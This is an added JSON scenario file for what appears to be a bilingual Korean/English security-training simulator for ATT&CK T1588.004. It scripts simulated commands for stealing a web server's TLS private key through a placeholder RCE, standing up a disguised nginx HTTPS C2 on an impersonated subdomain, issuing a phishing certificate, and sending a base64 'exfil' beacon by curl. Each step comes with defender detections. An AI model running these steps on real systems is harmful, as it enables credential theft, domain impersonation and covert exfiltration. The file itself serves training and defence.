@@ -1,0 +1,187 @@
+{
+  "id": "T1588.004",
+  "title": "디지털 인증서 획득 시뮬레이션",
+  "titleEn": "Obtain Digital Certificate Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 인증서 탈취", "labelEn": "🔍 Certificate Theft", "steps": [0, 1] },
+    { "label": "⚡ C2 구축", "labelEn": "⚡ C2 Setup", "steps": [2, 3] },
+    { "label": "✅ 통신 테스트", "labelEn": "✅ Communication Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "websvr", "label": "Web Server", "x": 200, "y": 30 },
+    { "id": "cert", "label": "Stolen Cert", "x": 200, "y": 90 },
+    { "id": "c2", "label": "HTTPS C2", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim PC", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "websvr", "minStep": 0 },
+    { "from": "websvr", "to": "cert", "minStep": 1 },
+    { "from": "cert", "to": "c2", "minStep": 2 },
+    { "from": "c2", "to": "victim", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "privkey.pem", "icon": "🔐", "alert": true },
+    { "name": "fullchain.pem", "icon": "📄" },
+    { "name": "nginx.conf", "icon": "⚙️" }
+  ],
+  "steps": [
+    {
+      "cmd": "python3 exploit_cve2026_xxxx.py --target 10.10.30.80 --type rce --cmd 'tar czf /tmp/certs.tar.gz /etc/letsencrypt/live/{companyName}.com/'",
+      "out": "[*] CVE-2026-XXXX — Remote Code Execution\n[*] Target: 10.10.30.80 (Apache 2.4.58)\n[*] Sending payload...\n[+] RCE achieved! Shell access granted.\n[+] Executing: tar czf /tmp/certs.tar.gz /etc/letsencrypt/live/{companyName}.com/\n\n$ tar tzf certs.tar.gz\netc/letsencrypt/live/{companyName}.com/cert.pem\netc/letsencrypt/live/{companyName}.com/chain.pem\netc/letsencrypt/live/{companyName}.com/fullchain.pem\netc/letsencrypt/live/{companyName}.com/privkey.pem\n\n[+] Certificate bundle extracted: 4 files",
+      "def": "[WAF] Exploitation attempt detected — CVE-2026-XXXX RCE payload blocked",
+      "defAction": "Source: Attacker IP 203.0.113.50\nTarget: 10.10.30.80:443 (Apache)\nAction: WAF rule triggered, IP blocked, incident response initiated",
+      "desc": "웹서버 취약점을 악용하여 Let's Encrypt 인증서 파일(개인키 포함)을 탈취합니다.",
+      "descEn": "Exploiting web server vulnerability to steal Let's Encrypt certificate files including private key.",
+      "stepTitle": "웹서버 인증서 파일 탈취",
+      "stepTitleEn": "Web Server Certificate File Theft",
+      "feynman": "은행 금고를 털어 '보안 열쇠'를 훔치는 것과 같습니다. 웹서버의 보안 취약점을 이용해 침입한 뒤, SSL/TLS 인증서의 개인키(privkey.pem)를 탈취합니다. 이 열쇠가 있으면 해당 도메인의 암호화 통신을 완전히 제어할 수 있습니다.",
+      "feynmanEn": "Like robbing a bank vault to steal a security key. After exploiting a web server vulnerability, the SSL/TLS certificate private key (privkey.pem) is stolen. With this key, the attacker can fully control encrypted communications for that domain.",
+      "expert": "Let's Encrypt 인증서는 /etc/letsencrypt/live/ 경로에 저장됩니다. privkey.pem이 핵심이며, 이를 탈취하면 해당 도메인의 TLS 통신을 복호화하거나 사칭할 수 있습니다.",
+      "expertEn": "Let's Encrypt certificates are stored in /etc/letsencrypt/live/. privkey.pem is the critical file — stealing it allows decrypting or impersonating TLS communications for that domain.",
+      "defTooltip": "🔗 WAF: 웹서버 RCE 익스플로잇 시도 탐지 및 차단",
+      "defTooltipEn": "🔗 WAF: Web server RCE exploit attempt detected and blocked",
+      "hackerLog": {
+        "title": "cert_exfil.log",
+        "lines": [
+          { "log": "Exploit: CVE-2026-XXXX (Apache RCE)", "desc": "💡 웹서버 원격 코드 실행 취약점으로 침투" },
+          { "log": "File: privkey.pem (CRITICAL)", "desc": "💡 개인키 탈취 — 도메인 완전 사칭 가능" },
+          { "log": "Domain: {companyName}.com", "desc": "💡 합법 도메인의 인증서 — 높은 신뢰도" }
+        ]
+      },
+      "terms": [
+        { "name": "privkey.pem", "desc": "SSL/TLS 인증서의 개인키. 이 파일이 유출되면 해당 도메인의 암호화 통신이 완전히 무력화됨." },
+        { "name": "Let's Encrypt", "desc": "무료 자동화 SSL/TLS 인증서 발급 기관. DV(Domain Validation) 인증서만 제공." }
+      ]
+    },
+    {
+      "cmd": "openssl x509 -in fullchain.pem -noout -subject -issuer -dates -ext subjectAltName && openssl rsa -in privkey.pem -check -noout",
+      "out": "subject=CN = {companyName}.com\nissuer=CN = R3, O = Let's Encrypt, C = US\nnotBefore=Feb 15 00:00:00 2026 GMT\nnotAfter=May 16 23:59:59 2026 GMT\nX509v3 Subject Alternative Name:\n    DNS:{companyName}.com, DNS:*.{companyName}.com, DNS:mail.{companyName}.com, DNS:vpn.{companyName}.com\n\nRSA key ok",
+      "def": "[Certificate Monitor] Private key verification performed on {companyName}.com wildcard certificate from unusual host",
+      "defAction": "Source: External host (not {companyName} infrastructure)\nTarget: {companyName}.com wildcard certificate\nAction: Certificate abuse alert, key rotation recommended",
+      "desc": "탈취한 인증서의 SAN(Subject Alternative Name) 필드를 확인합니다. 와일드카드가 포함되어 모든 서브도메인 사칭이 가능합니다.",
+      "descEn": "Checking the SAN field of the stolen certificate. Wildcard inclusion allows impersonation of all subdomains.",
+      "stepTitle": "인증서 SAN 분석",
+      "stepTitleEn": "Certificate SAN Analysis",
+      "feynman": "훔친 열쇠가 어떤 문을 열 수 있는지 확인하는 것입니다. SAN(Subject Alternative Name) 필드에 와일드카드(*.{companyName}.com)가 포함되어 있으면, 이 하나의 인증서로 mail, vpn 등 모든 서브도메인을 사칭할 수 있습니다.",
+      "feynmanEn": "Like checking which doors a stolen key can open. If the SAN field includes a wildcard (*.{companyName}.com), this single certificate can impersonate all subdomains including mail, vpn, etc.",
+      "expert": "와일드카드 인증서는 공격 표면을 크게 확대합니다. mail.{companyName}.com을 사칭하면 이메일 MitM이, vpn.{companyName}.com을 사칭하면 VPN 자격증명 탈취가 가능합니다.",
+      "expertEn": "Wildcard certificates greatly expand the attack surface. Impersonating mail.{companyName}.com enables email MitM, while vpn.{companyName}.com enables VPN credential theft.",
+      "defTooltip": "🔗 인증서 모니터: 비정상 호스트에서 개인키 검증 감지",
+      "defTooltipEn": "🔗 Certificate Monitor: Private key verification from unusual host detected",
+      "hackerLog": {
+        "title": "san_analysis.log",
+        "lines": [
+          { "log": "SAN: *.{companyName}.com (wildcard)", "desc": "💡 와일드카드 — 모든 서브도메인 사칭 가능" },
+          { "log": "Includes: mail, vpn subdomains", "desc": "💡 이메일/VPN 서비스까지 사칭 가능" },
+          { "log": "RSA key: OK (valid private key)", "desc": "💡 개인키 유효 — 즉시 악용 가능 상태" }
+        ]
+      },
+      "terms": [
+        { "name": "SAN", "desc": "Subject Alternative Name. 하나의 인증서에 여러 도메인/서브도메인을 포함할 수 있는 X.509 확장 필드." },
+        { "name": "와일드카드 인증서", "desc": "*.domain.com 형식으로 모든 서브도메인을 커버하는 인증서. 편리하지만 탈취 시 위험성이 높음." }
+      ]
+    },
+    {
+      "cmd": "cat > /opt/c2/nginx-c2.conf << 'CONF'\nserver {\n    listen 443 ssl http2;\n    server_name cdn.{companyName}.com;\n    ssl_certificate /opt/certs/fullchain.pem;\n    ssl_certificate_key /opt/certs/privkey.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers HIGH:!aNULL:!MD5;\n    location /api/v2/telemetry { proxy_pass http://127.0.0.1:50050; }\n    location / { return 200 '{\"status\":\"ok\"}'; add_header Content-Type application/json; }\n}\nCONF\nnginx -t && nginx -s reload",
+      "out": "nginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nnginx: configuration file /etc/nginx/nginx.conf test is successful\n\n$ curl -k https://cdn.{companyName}.com/\n{\"status\":\"ok\"}\n\n$ echo | openssl s_client -connect cdn.{companyName}.com:443 2>/dev/null | grep 'subject='\nsubject=CN = {companyName}.com\n\n[+] HTTPS C2 listener active on cdn.{companyName}.com:443\n[+] Certificate: Valid {companyName}.com wildcard\n[+] C2 endpoint: /api/v2/telemetry",
+      "def": "[DNS Monitor] New A record for cdn.{companyName}.com pointing to unknown IP — possible domain hijack",
+      "defAction": "Source: DNS zone for {companyName}.com\nTarget: cdn.{companyName}.com → 203.0.113.50\nAction: DNS change alert, IP ownership verification requested",
+      "desc": "탈취한 와일드카드 인증서로 합법적인 서브도메인을 사칭하는 HTTPS C2 서버를 구축합니다.",
+      "descEn": "Setting up HTTPS C2 server impersonating a legitimate subdomain using the stolen wildcard certificate.",
+      "stepTitle": "HTTPS C2 서버 구축",
+      "stepTitleEn": "HTTPS C2 Server Setup",
+      "feynman": "훔친 열쇠로 가짜 지점을 차리는 것입니다. cdn.{companyName}.com이라는 주소로 서버를 만들면, 이 서버는 진짜 {companyName} 회사의 CDN 서버처럼 보입니다. 인증서가 유효하므로 브라우저에서 자물쇠 아이콘도 표시됩니다.",
+      "feynmanEn": "Like setting up a fake branch with a stolen key. Creating a server at cdn.{companyName}.com makes it look like the real company's CDN server. The valid certificate means browsers show the lock icon.",
+      "expert": "Nginx 리버스 프록시로 C2 트래픽을 /api/v2/telemetry 경로로 라우팅합니다. 다른 경로는 정상 JSON 응답을 반환하여 스캔 탐지를 회피합니다.",
+      "expertEn": "Nginx reverse proxy routes C2 traffic to /api/v2/telemetry path. Other paths return normal JSON responses to evade scanning detection.",
+      "defTooltip": "🔗 DNS 모니터: cdn.{companyName}.com DNS 레코드 변경 감지",
+      "defTooltipEn": "🔗 DNS Monitor: cdn.{companyName}.com DNS record change detected",
+      "hackerLog": {
+        "title": "c2_setup.log",
+        "lines": [
+          { "log": "Domain: cdn.{companyName}.com", "desc": "💡 합법 서브도메인 사칭 — 네트워크 필터링 우회" },
+          { "log": "TLS: Valid wildcard cert", "desc": "💡 브라우저/보안장비가 유효한 인증서로 인식" },
+          { "log": "C2 path: /api/v2/telemetry", "desc": "💡 API 텔레메트리로 위장 — 정상 트래픽과 혼합" }
+        ]
+      },
+      "terms": [
+        { "name": "리버스 프록시", "desc": "클라이언트 요청을 받아 백엔드 서버로 전달하는 중간 서버. C2 서버 실체를 숨기는 데 활용." },
+        { "name": "HTTP/2", "desc": "HTTP 프로토콜 2세대. 멀티플렉싱으로 성능 향상 + 헤더 압축으로 트래픽 분석 방해." }
+      ]
+    },
+    {
+      "cmd": "certbot certonly --manual --preferred-challenges dns -d login-{companyName}[.]com --email attacker@protonmail.com --agree-tos --non-interactive",
+      "out": "Saving debug log to /var/log/letsencrypt/letsencrypt.log\nRequesting a certificate for login-{companyName}.com\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nPlease deploy a DNS TXT record under the name:\n_acme-challenge.login-{companyName}.com\nwith the following value:\nxH7k9mN3pQ2rS5tV8wY1zA4bC6dE0fG\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n\n[DNS TXT record deployed]\n\nSuccessfully received certificate.\nCertificate is saved at: /etc/letsencrypt/live/login-{companyName}.com/fullchain.pem\nKey is saved at: /etc/letsencrypt/live/login-{companyName}.com/privkey.pem\n\n[+] Phishing cert ready: login-{companyName}.com",
+      "def": "[CT Log Monitor] New certificate issued for login-{companyName}.com — lookalike domain detected",
+      "defAction": "Source: Let's Encrypt CT Log\nTarget: login-{companyName}.com\nAction: Brand protection alert, domain takedown request submitted",
+      "desc": "유사 도메인(login-{companyName}.com)을 등록하고 Let's Encrypt로 합법적인 인증서를 발급받아 피싱에 활용합니다.",
+      "descEn": "Registering a lookalike domain (login-{companyName}.com) and obtaining a legitimate Let's Encrypt certificate for phishing.",
+      "stepTitle": "피싱 도메인 인증서 발급",
+      "stepTitleEn": "Phishing Domain Certificate Issuance",
+      "feynman": "가짜 은행 간판에 '진짜 사업자등록증'을 받는 것입니다. Let's Encrypt는 도메인 소유만 확인하므로, 비슷한 이름의 도메인(login-{companyName}.com)을 등록하면 누구나 합법적인 인증서를 무료로 받을 수 있습니다. 브라우저에 자물쇠 아이콘이 표시되어 피싱의 신뢰도가 높아집니다.",
+      "feynmanEn": "Like getting a real business license for a fake bank. Let's Encrypt only verifies domain ownership, so registering a similar domain (login-{companyName}.com) lets anyone get a free legitimate certificate.",
+      "expert": "Let's Encrypt의 DV 인증서는 도메인 제어만 검증합니다. ACME DNS-01 챌린지로 자동 발급이 가능하며, CT 로그 모니터링으로만 탐지할 수 있습니다.",
+      "expertEn": "Let's Encrypt DV certificates only verify domain control. ACME DNS-01 challenge enables automated issuance, detectable only through CT log monitoring.",
+      "defTooltip": "🔗 CT 로그 모니터: 유사 도메인 인증서 발급 감지",
+      "defTooltipEn": "🔗 CT Log Monitor: Lookalike domain certificate issuance detected",
+      "hackerLog": {
+        "title": "phishing_cert.log",
+        "lines": [
+          { "log": "Domain: login-{companyName}.com", "desc": "💡 유사 도메인 — 정상 로그인 페이지로 착각 유도" },
+          { "log": "Issuer: Let's Encrypt (FREE)", "desc": "💡 무료 DV 인증서 — 도메인 소유만으로 발급 가능" },
+          { "log": "HTTPS: Valid + Lock icon", "desc": "💡 브라우저 자물쇠 표시 — 피싱 신뢰도 극대화" }
+        ]
+      },
+      "terms": [
+        { "name": "DV 인증서", "desc": "Domain Validation. 도메인 소유권만 확인하여 발급하는 기본 SSL 인증서. 신원 확인 없음." },
+        { "name": "CT 로그", "desc": "Certificate Transparency. 모든 인증서 발급을 공개 로그에 기록하여 부정 발급을 탐지하는 시스템." }
+      ]
+    },
+    {
+      "cmd": "curl -s https://cdn.{companyName}.com/api/v2/telemetry -X POST -H 'Content-Type: application/json' -d '{\"beacon_id\":\"0x1a2b\",\"data\":\"ZXhmaWw6IHNlbnNpdGl2ZV9kYXRh\"}' && echo '\\n---' && openssl s_client -connect cdn.{companyName}.com:443 2>/dev/null | openssl x509 -noout -fingerprint -sha256",
+      "out": "{\"status\":\"received\",\"next_sleep\":60,\"tasks\":[]}\n---\nSHA256 Fingerprint=AB:CD:EF:12:34:56:78:9A:BC:DE:F0:12:34:56:78:9A:AB:CD:EF:12:34:56:78:9A:BC:DE:F0:12:34:56:78:9A\n\n[+] C2 communication test successful\n[+] TLS: Valid certificate (no browser warnings)\n[+] Beacon data: Base64-encoded exfiltration payload accepted\n[+] Certificate fingerprint verified against stolen cert",
+      "def": "[SIEM] HTTPS POST to /api/v2/telemetry with Base64 body — C2 beacon pattern detected despite valid certificate",
+      "defAction": "Source: Internal host 10.10.50.30\nTarget: cdn.{companyName}.com:443\nAction: TLS inspection enabled, Base64 payload decoded, C2 traffic confirmed and blocked",
+      "desc": "탈취한 인증서를 사용한 HTTPS C2 채널의 통신을 테스트합니다. 유효한 인증서로 TLS 검사를 우회합니다.",
+      "descEn": "Testing HTTPS C2 channel communication using the stolen certificate. Valid certificate bypasses TLS inspection.",
+      "stepTitle": "C2 통신 테스트",
+      "stepTitleEn": "C2 Communication Test",
+      "feynman": "가짜 지점에서 '거래 테스트'를 하는 것입니다. 감염된 컴퓨터(Beacon)가 cdn.{companyName}.com으로 암호화된 데이터를 보내면, 네트워크 보안 장비는 유효한 {companyName} 인증서를 보고 정상 트래픽으로 판단합니다. 이렇게 도난된 정보가 암호화된 채널을 통해 안전하게(?) 유출됩니다.",
+      "feynmanEn": "Like running a test transaction at a fake branch. When an infected computer (Beacon) sends encrypted data to cdn.{companyName}.com, network security sees the valid certificate and considers it normal traffic.",
+      "expert": "TLS 인터셉션(SSL 검사)을 수행하지 않는 환경에서는 유효한 인증서의 HTTPS 트래픽 내용을 검사할 수 없습니다. JA3 핑거프린트와 트래픽 패턴 분석이 대안입니다.",
+      "expertEn": "Without TLS interception (SSL inspection), environments cannot inspect HTTPS traffic content with valid certificates. JA3 fingerprinting and traffic pattern analysis are alternatives.",
+      "defTooltip": "🔗 SIEM: 유효한 인증서임에도 C2 비콘 패턴 탐지",
+      "defTooltipEn": "🔗 SIEM: C2 beacon pattern detected despite valid certificate",
+      "hackerLog": {
+        "title": "c2_test.log",
+        "lines": [
+          { "log": "TLS: Valid {companyName}.com cert", "desc": "💡 유효한 인증서 — TLS 검사 없으면 탐지 불가" },
+          { "log": "Payload: Base64 exfil data", "desc": "💡 암호화된 C2 채널로 데이터 유출" },
+          { "log": "Response: next_sleep=60", "desc": "💡 C2 서버가 60초 대기 지시 — 비코닝 패턴" }
+        ]
+      },
+      "terms": [
+        { "name": "TLS Interception", "desc": "네트워크 장비가 HTTPS 트래픽을 복호화하여 검사하는 기법. 유효한 인증서의 악성 트래픽 탐지에 필요." },
+        { "name": "Beaconing", "desc": "감염된 호스트가 C2 서버에 주기적으로 접속하는 패턴. 시간 간격 분석으로 탐지 가능." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "pid": 1, "name": "init", "children": [
+      { "pid": 1200, "name": "bash", "children": [
+        { "pid": 1201, "name": "exploit_cve2026.py", "children": [
+          { "pid": 1202, "name": "tar czf certs", "children": [] }
+        ]},
+        { "pid": 1205, "name": "openssl x509 (analysis)", "children": [] },
+        { "pid": 1210, "name": "nginx (C2 proxy)", "children": [
+          { "pid": 1211, "name": "c2_listener:50050", "children": [] }
+        ]},
+        { "pid": 1215, "name": "certbot (phishing cert)", "children": [] },
+        { "pid": 1220, "name": "curl (C2 test)", "children": [] }
+      ]}
+    ]}
+  ]
+}
